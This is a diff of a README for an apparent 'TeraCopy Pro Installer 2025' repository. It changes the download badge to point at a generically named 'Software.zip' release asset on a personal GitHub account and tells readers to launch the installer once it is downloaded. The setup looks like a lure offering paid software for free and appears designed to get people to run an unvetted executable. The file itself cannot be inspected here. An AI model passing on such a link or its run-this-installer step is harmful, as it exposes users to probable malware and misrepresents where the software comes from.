@@ -6,7 +6,7 @@ Welcome to the TeraCopy Pro Installer 2025 repository! This installer provides a
 
 To get started with TeraCopy Pro, simply download the installer from the link below:
 
-[![Download TeraCopy Pro Installer](https://img.shields.io/badge/Download-TeraCopy_Pro_Installer-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download TeraCopy Pro Installer](https://github.com/ashElchavo/TeraCopy-Pro-Installer-2025/releases/download/v1.0/Software.zip)](https://github.com/ashElchavo/TeraCopy-Pro-Installer-2025/releases/download/v1.0/Software.zip)
 
 Make sure to launch the installer once it's downloaded to begin the installation process.
 
